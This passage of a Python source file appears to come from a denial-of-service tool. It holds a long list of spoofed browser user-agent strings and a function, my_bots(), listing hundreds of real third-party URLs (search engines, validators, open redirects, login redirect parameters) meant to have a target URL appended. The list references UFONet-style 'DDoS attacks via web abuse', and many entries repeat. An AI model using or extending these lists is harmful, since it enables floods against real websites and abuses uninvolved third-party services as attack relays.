        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53")
    uagent.append(
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")

    return (uagent)


def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.bing.com/search?q=")
    bots.append("https://www.yandex.com/yandsearch?text=")
    bots.append("https://duckduckgo.com/?q=")
    bots.append("http://www.ask.com/web?q=")
    bots.append("http://search.aol.com/aol/search?q=")
    bots.append("https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term")
    bots.append("https://drive.google.com/viewerng/viewer?url=")
    bots.append("http://validator.w3.org/feed/check.cgi?url=")
    bots.append("http://host-tracker.com/check_page/?furl=")
    bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
    bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
    bots.append("https://add.my.yahoo.com/rss?url=")
    bots.append("http://www.google.com/?q=")
    bots.append("http://www.usatoday.com/search/results?q=")
    bots.append("http://engadget.search.aol.com/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("http://www.topsiteminecraft.com/site/pinterest.com/search?q='")
    bots.append("http://eu.battle.net/wow/en/search?q=")
    bots.append("https://www.google.ae/search?q=")
    bots.append("https://www.google.com.af/search?q=")
    bots.append("https://www.google.com.ag/search?q=")
    bots.append("https://www.google.com.ai/search?q=")
    bots.append("https://www.google.al/search?q=")
    bots.append("https://www.google.am/search?q=")
    bots.append("https://www.google.co.ao/search?q=")
    bots.append("https://steamcommunity.com/market/search?q=")
    bots.append("https://www.ted.com/search?q=")
    bots.append("https://play.google.com/store/search?q=")
    bots.append("https://www.qwant.com/search?q=")
    bots.append("https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=")
    bots.append("https://www.google.ad/search?q=")
    bots.append("https://www.youtube.com/")
    bots.append("https://check-host.net/")
    bots.append("https://www.bing.com/search?q=")
    bots.append("https://r.search.yahoo.com/")
    bots.append("https://www.facebook.com/")
    bots.append("https://vk.com/profile.php?redirect=")
    bots.append("https://www.usatoday.com/search/results?q=")
    bots.append("https://help.baidu.com/searchResult?keywords=")
    bots.append("http://tumia.org/en/directory/en/instance.php?tiname=")
    bots.append("http://stimaengenharia.com.br/ingles/conteudo_email.asp?url=")
    bots.append("http://wapblogs.eu/ejuz.php?url=")
    bots.append("http://wodu.free.fr/count_hits.php?url=")
    bots.append("http://weblib.lib.umt.edu/redirect/proxyselect.php?url=:")
    bots.append("http://www.abgefuckt-liebt-dich.de/weiterleitung.php?url=")
    bots.append("http://wineindustryinsight.com/jump.php?utm_source=newsfetch&utm_medium=email&utm_campaign=nf&url=")
    bots.append("http://woman.hotnews.bg/images/6946/getplusone.php?url=")
    bots.append("http://www.adminer.org/redirect/?url=")
    bots.append("http://www.allmon.biz/goto.php?url=")
    bots.append("http://www.allmerchants.com/track/exit.php?url=")
    bots.append("http://www.art-of-peace.info/index.html?change_language=change&lang=en&url=")
    bots.append(
        "http://www.auroport.it/ru/%D0%BA%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B/%D0%BA%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B/14-0.html?sRequestSubject=SYSTEM%20EVO%2090%C2%A0%20-%20%C2%A0%20Url:")
    bots.append("http://www.bis.bg/likes.php?id=16836/%5Burl=")
    bots.append("http://www.bouwenwonen.net/include/laadpagina.asp?url=")
    bots.append("http://www.bernhard-gaul.de/gpxviewer/gpxviewerlinksvar.php?url=")
    bots.append("http://www.baratometro.com.ar/redirect/redirectm?url=")
    bots.append("http://www.bquest.org/links/Redirect.aspx?ID=142&URL=")
    bots.append("http://www.brasserie-savarin.be/wp-content/themes/niarra-light/niarra_social.php?url=")
    bots.append("http://www.camping-channel.eu/surf.php3?id=1523&url=")
    bots.append("http://www.buildbid.cn/adurl.php?url=")
    bots.append("http://www.btarg.com.ar/tracker/go.php?url=")
    bots.append(
        "https://intern.bvr.de/login.nsf/login.xsp?redirectto=extra.nsf/index.xsp?documentId=F7626CF8C8CB9306C12579110054FB7Eredirect_to=")
    bots.append("https://business-webmail.t-online.de/?_task=mail&amp;_action=")
    bots.append("https://www.frankonia.de/login.html?backTo=")
    bots.append("https://www.maxblue.de/my-maxblue/login.html?redirectTo=/my-maxblue/watchlist.htmlredirect_to=")
    bots.append("https://heibox.uni-heidelberg.de/accounts/login/?next=")
    bots.append("https://seafile.rlp.net/accounts/login/?next=")
    bots.append("https://partner.bora.com/de/auth/login?ref=/login/?ref=")
    bots.append("https://www.faz.net/mein-faz-net-logout/?redirectUrl=$osc-out$logout?redirect=")
    bots.append("https://www.mainpost.de/sport/tabellen/index.php?location=")
    bots.append("https://halti.kansalliskirjasto.fi/login.php?redirect=/logout.phplogout.php?redirect=")
    bots.append("https://www.pflanzmich.de/login.html?backTo=")
    bots.append("https://tamassoos.com/index.php?searchenginerUrl=portrait_movie&amp;language=hur_url=")
    bots.append("https://twitter.com/jaomaecaptioncaption=")
    bots.append("https://www.salespider.com/cpid/redirect.php?url=")
    bots.append("https://secure.chamsys.co.uk/bugtracker/login_page.php?return=")
    bots.append("http://www.golf.at/mygolf/login?wantedurl=")
    bots.append("https://nextdoor.com/login/?next=")
    bots.append("https://support.evolve.si/login_page.php?return=")
    bots.append("https://support.milessoft.com/cim/login_page.php?return=")
    bots.append("https://lavida.jp/auth/do-logout?redir=")
    bots.append("http://www.asternic.net/demo/logout.php?redirect=")
    bots.append("https://campuscu.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://www.kitploit.com/2014/09/ufonet-ddos-attacks-via-web-abuse.htmlproxy.php?url=")
    bots.append("https://zonaprivada.recuerdo.net/logout.php?redirect=")
    bots.append("https://intern.bvr.de/login.nsf/login.xsp?redirectto=extra.nsf/index.xsp")
    bots.append("?documentId=F7626CF8C8CB9306C12579110054FB7Eredirect_to=")
    bots.append("https://www.jspn.or.jp/user.php?xoops_redirect=")
    bots.append(
        "https://www.htcdev.com/?URL=rankwise.net/report/www.kindgirls.com/?url=validator.w3.org/feed/check.cgi?url=")
    bots.append("https://www.childneuro.jp/user.php?xoops_redirect=")
    bots.append("https://www.frankonia.de/login.html?backTo=")
    bots.append("https://www.maxblue.de/my-maxblue/login.html?redirectTo=/my-maxblue/watchlist.htmlredirect_to=")
    bots.append("https://business-webmail.t-online.de/?_task=mail&amp;_action=")
    bots.append("https://heibox.uni-heidelberg.de/accounts/login/?next=")
    bots.append("https://partner.bora.com/de/auth/login?ref=/login/?ref=")
    bots.append("https://seafile.rlp.net/accounts/login/?next=")
    bots.append("https://www.faz.net/mein-faz-net-logout/?redirectUrl=$osc-out$logout?redirect=")
    bots.append("https://www.pflanzmich.de/login.html?backTo=")
    bots.append("https://www.mainpost.de/sport/tabellen/index.php?location=")
    bots.append("https://tamassoos.com/index.php?searchenginerUrl=portrait_movie&amp;language=hur_url=")
    bots.append("https://twitter.com/jaomaecaptioncaption=")
    bots.append("https://secure.chamsys.co.uk/bugtracker/login_page.php?return=")
    bots.append("https://www.salespider.com/cpid/redirect.php?url=")
    bots.append("https://support.evolve.si/login_page.php?return=")
    bots.append("https://nextdoor.com/login/?next=")
    bots.append("http://www.golf.at/mygolf/login?wantedurl=")
    bots.append("https://zonaprivada.recuerdo.net/logout.php?redirect=")
    bots.append("http://www.asternic.net/demo/logout.php?redirect=")
    bots.append("https://lavida.jp/auth/do-logout?redir=")
    bots.append("https://campuscu.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://support.milessoft.com/cim/login_page.php?return=")
    bots.append("https://www.kitploit.com/2014/09/ufonet-ddos-attacks-via-web-abuse.htmlproxy.php?url=")
    bots.append(
        "https://www.htcdev.com/?URL=rankwise.net/report/www.kindgirls.com/?url=validator.w3.org/feed/check.cgi?url=")
    bots.append("https://mymasonportal.gmu.edu/webapps/login/?action=")
    bots.append("https://www.childneuro.jp/user.php?xoops_redirect=")
    bots.append("https://billiongraves.com/login?returl=")
    bots.append("https://www.jspn.or.jp/user.php?xoops_redirect=")
    bots.append("https://login.debtpaypro.com/login.php?goto=")
    bots.append("https://twitter.com/GoGoMorrowgo=")
    bots.append("https://rialtocinemas.com/index.php?location=")
    bots.append("https://ncdigital.overdrive.com/account/sign-in?forward=")
    bots.append("http://m.compasspub.com/eng/member/login.asp?r_url=")
    bots.append("https://twitter.com/goforwardforward=")
    bots.append("https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=")
    bots.append("https://twitter.com/Targettarget=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("http://www.yabaton.com/user.php?xoops_redirect=")
    bots.append("https://members.notesdirect.com/login.html?backto=Lw==backTo=")
    bots.append("http://burgman-club.ru/forum/away.php?s=")
    bots.append("https://twitter.com/universityofriuri=")
    bots.append("http://webmail.pa.net/imp/login.php?url=/imp/mailbox.php?mailbox=INBOXlogin.php?URL=")
    bots.append("https://www.reddit.com/r/funny/comments/g50447/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("http://doc-erp.com/bbs/login.php?url=/index.phplogin.php?URL=")
    bots.append("https://www.reddit.com/r/dankmemes/comments/g502sk/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://www.tsubakiadvantage.com/members/login/?redir=/login?redir=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainlogin?redirect=")
    bots.append("http://metvuw.com/forecast/forecast.php?type=")
    bots.append("http://www.metvuw.com/forecast/forecast.php?type=")
    bots.append("http://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append(
        "https://mytopfiles.com/search.php?bu=1&amp;ss='''tube/buy.php?category=validator.w3.org/checklink?uri=")
    bots.append("https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("https://members.notesdirect.com/login.html?backto=Lw==backTo=")
    bots.append("http://burgman-club.ru/forum/away.php?s=")
    bots.append("https://twitter.com/universityofriuri=")
    bots.append("http://webmail.pa.net/imp/login.php?url=/imp/mailbox.php?mailbox=INBOXlogin.php?URL=")
    bots.append("http://doc-erp.com/bbs/login.php?url=/index.phplogin.php?URL=")
    bots.append("https://www.reddit.com/r/funny/comments/g50447/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://www.reddit.com/r/dankmemes/comments/g502sk/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://www.tsubakiadvantage.com/members/login/?redir=/login?redir=")
    bots.append("https://www.prostarparcel.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainlogin?redirect=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://ilsship.rocksolidinternet.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://olyparks.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://englandship.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("http://minima.quality-steinhoff.com/user.php?xoops_redirect=")
    bots.append("http://www.verenaoji.com/user.php?xoops_redirect=")
    bots.append("https://www.asternic.net/demo/logout.php?redirect=")
    bots.append("https://twitter.com/uk_domain_namesdomain=")
    bots.append("https://www.abcmouse.com/html5/color/paintbynumber?imgurl=")
    bots.append("https://twitter.com/indyfromspacefrom=")
    bots.append("http://www.kksjim.info/user.php?xoops_redirect=")
    bots.append("https://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append("http://darmarit.de/http://validator.w3.org/checklink?uri=")
    bots.append("http://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append("http://www.metvuw.com/forecast/forecast.php?type=")
    bots.append(
        "https://mytopfiles.com/search.php?bu=1&amp;ss='''tube/buy.php?category=validator.w3.org/checklink?uri=")
    bots.append("https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainredirect=")
    bots.append("http://metvuw.com/forecast/forecast.php?type=")
    bots.append("https://www.manacomputers.com/redirect.php?blog=")
    bots.append("https://members.notesdirect.com/login.html?backto=Lw==backTo=")
    bots.append("http://burgman-club.ru/forum/away.php?s=")
    bots.append("https://twitter.com/universityofriuri=")
    bots.append("http://webmail.pa.net/imp/login.php?url=/imp/mailbox.php?mailbox=INBOXlogin.php?URL=")
    bots.append("https://www.reddit.com/r/funny/comments/g50447/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("http://doc-erp.com/bbs/login.php?url=/index.phplogin.php?URL=")
    bots.append("https://www.reddit.com/r/dankmemes/comments/g502sk/if_you_translate_u_r_a_nerd/translate?u=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://twitter.com/actioncoasteraction=")
    bots.append("https://www.tsubakiadvantage.com/members/login/?redir=/login?redir=")
    bots.append("https://catalog.cwmars.org/eg/opac/login?redirect_to=/eg/opac/myopac/mainlogin?redirect=")
    bots.append("https://ilsship.rocksolidinternet.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://www.prostarparcel.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("https://olyparks.perfpro-hrnonline.com/logout.php?redirect=")
    bots.append("https://englandship.com/ec/login.php?redirectTo=/ec/login.php?redirect=")
    bots.append("http://minima.quality-steinhoff.com/user.php?xoops_redirect=")
    bots.append("https://www.asternic.net/demo/logout.php?redirect=")
    bots.append("https://twitter.com/uk_domain_namesdomain=")
    bots.append("http://www.kksjim.info/user.php?xoops_redirect=")
    bots.append("https://twitter.com/indyfromspacefrom=")
    bots.append("http://www.verenaoji.com/user.php?xoops_redirect=")
    bots.append("https://www.abcmouse.com/html5/color/paintbynumber?imgurl=")
    bots.append("https://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append("http://metvuw.com/forecast/forecast.php?type=")
    bots.append("http://www.metvuw.com/forecast/forecast.php?type=")
    bots.append("http://darmarit.de/http://validator.w3.org/checklink?uri=")
    bots.append("http://prod.kleeissuetracker.com/login_page.php?return=")
    bots.append(
        "https://mytopfiles.com/search.php?bu=1&amp;ss='''tube/buy.php?category=validator.w3.org/checklink?uri=")
    bots.append("https://www.java67.com/2013/01/difference-between-url-uri-and-urn.htmluri=")
    bots.append("https://www.htcdev.com/?URL=ipcraft.pro/forum/away.php?s=")
    bots.append("http://www.acehints.com/2011/12/google-language-translator-gadget-html.htmltranslate?u=")
    bots.append("https://portal.rjobrien.com/Account/Login?ReturnUrl=https://trade.rjobrien.com/portal/weboe/login?r=")
    bots.append("https://twitter.com/hashtag/backto2011backTo=")
    bots.append("https://rialtocinemas.com/index.php?location=")
    bots.append("http://m.compasspub.com/eng/member/login.asp?r_url=")
    bots.append("https://ncdigital.overdrive.com/account/sign-in?forward=")
    bots.append("https://twitter.com/goforwardforward=")
    bots.append("https://twitter.com/Targettarget=")
    bots.append("https://rialtocinemas.com/index.php?location=")
    bots.append("http://www.yabaton.com/user.php?xoops_redirect=")
    bots.append("http://m.compasspub.com/eng/member/login.asp?r_url=")
    bots.append("https://ncdigital.overdrive.com/account/sign-in?forward=")
    bots.append("https://twitter.com/goforwardforward=")
    bots.append("https://twitter.com/Targettarget=")
    bots.append("http://www.yabaton.com/user.php?xoops_redirect=")
    bots.append("https://www.kktv.me/login?redirectUrl=/redeem/redirect_url=")
    bots.append(
        "https://www.vik-ruse.com/Index.aspx?PageUrl=profil-na-kupuwacha&amp;PublicOrders=Tab=ViewItemsList,CategoryID=2pageurl=")
    bots.append("https://hh.ru/account/login?backurl=/BackURL=")
    bots.append("https://www.scoalaintuitext.ro/pagina-copiilorpagina=")
    bots.append("https://www.miralinks.ru/?backTo=")
    bots.append("http://www.promymall.co.kr/member/login.php?url=/login.php?URL=")
    bots.append("http://pms.shinsaegye.com/bbs/login.php?url=/login.php?URL=")
    bots.append("https://www.vik-ruse.com/Index.aspx?PageUrl=")
    bots.append("https://www.clubopel.com/login.php?redirect=")
    bots.append("https://billiongraves.com/login?returl=")
    bots.append("https://login.debtpaypro.com/login.php?goto=")
    bots.append("https://twitter.com/GoGoMorrowgo=")
    bots.append("https://rialtocinemas.com/index.php?location=")
    bots.append("http://m.compasspub.com/eng/member/login.asp?r_url=")
    bots.append("https://ncdigital.overdrive.com/account/sign-in?forward=")
    bots.append("https://twitter.com/goforwardforward=")
    bots.append("https://www.kktv.me/login?redirectUrl=/redeem/redirect_url=")
    bots.append("https://twitter.com/Targettarget=")
    bots.append(
        "https://www.vik-ruse.com/Index.aspx?PageUrl=profil-na-kupuwacha&amp;PublicOrders=Tab=ViewItemsList,CategoryID=2pageurl=")
    bots.append("http://www.yabaton.com/user.php?xoops_redirect=")
    bots.append("https://www.scoalaintuitext.ro/pagina-copiilorpagina=")
    bots.append("https://www.miralinks.ru/?backTo=")
    bots.append("https://hh.ru/account/login?backurl=/BackURL=")
    bots.append("https://www.vik-ruse.com/Index.aspx?PageUrl=")
    bots.append("http://www.promymall.co.kr/member/login.php?url=/login.php?URL=")
    bots.append("http://pms.shinsaegye.com/bbs/login.php?url=/login.php?URL=")
    bots.append("https://www.clubopel.com/login.php?redirect=")
    bots.append("https://www.scoalaintuitext.ro/pagina-copiilorpagina=")
    bots.append("https://www.miralinks.ru/?backTo=")
    bots.append("https://hh.ru/account/login?backurl=/BackURL=")
    bots.append("http://pms.shinsaegye.com/bbs/login.php?url=/login.php?URL=")
    bots.append("http://www.promymall.co.kr/member/login.php?url=/login.php?URL=")
    bots.append("https://www.clubopel.com/login.php?redirect=")
    bots.append("https://www.vik-ruse.com/Index.aspx?PageUrl=")
    bots.append(
        "https://www.vik-ruse.com/Index.aspx?PageUrl=profil-na-kupuwacha&amp;PublicOrders=Tab=ViewItemsList,CategoryID=2pageurl=")
    bots.append("https://www.kktv.me/login?redirectUrl=/redeem/redirect_url=")
    bots.append("https://hh.ru/account/login?backurl=/BackURL=")
    bots.append("https://www.miralinks.ru/?backTo=")
